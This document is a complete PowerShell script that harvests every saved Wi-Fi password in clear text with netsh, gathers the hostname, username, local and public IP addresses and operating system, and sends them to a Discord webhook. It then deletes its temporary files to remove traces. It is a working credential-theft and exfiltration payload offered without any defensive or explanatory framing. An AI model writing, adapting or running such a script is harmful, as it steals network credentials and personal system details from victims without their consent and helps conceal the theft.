param(
    [string]$webhookUrl
)

# Create a temporary directory and change to it
$p = "$env:temp\wifi-passwords"; md $p >$null; cd $p;

# Export all wifi profiles to xml files in the current directory
netsh wlan export profile key=clear >$null;

# Parse the xml files and create a custom object with the name and password
$r = Get-ChildItem | ForEach-Object {
  $Xml = [xml](Get-Content -Path $_.FullName)
  [PSCustomObject]@{
    Name = $Xml.WLANProfile.Name
    Password = $Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial
  }
}

# Collect system info
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$datetime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$local_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    $_.InterfaceAlias -notlike "Loopback*" -and $_.IPAddress -notlike "169.*"
} | Select-Object -ExpandProperty IPAddress -First 1)

try {
    $public_ip = Invoke-RestMethod -Uri "http://api.ipify.org"
} catch {
    $public_ip = "Unable to get public IP"
}

$os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption

# Format the custom object as a table in a Markdown code block
$wifiTable = ($r | Format-Table | Out-String)
$info = @"
Host: $hostname
User: $username
Time: $datetime
IP: $local_ip | $public_ip
OS: $os
"@

# Combine system info and wifi table
$body = @{content = "```````n$info`n$wifiTable``````"}

# Send the formatted table to a Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method 'Post' -Body $body >$null;

# Delete the temporary directory and exit the script
cd ..; rm $p -r -fo; exit;
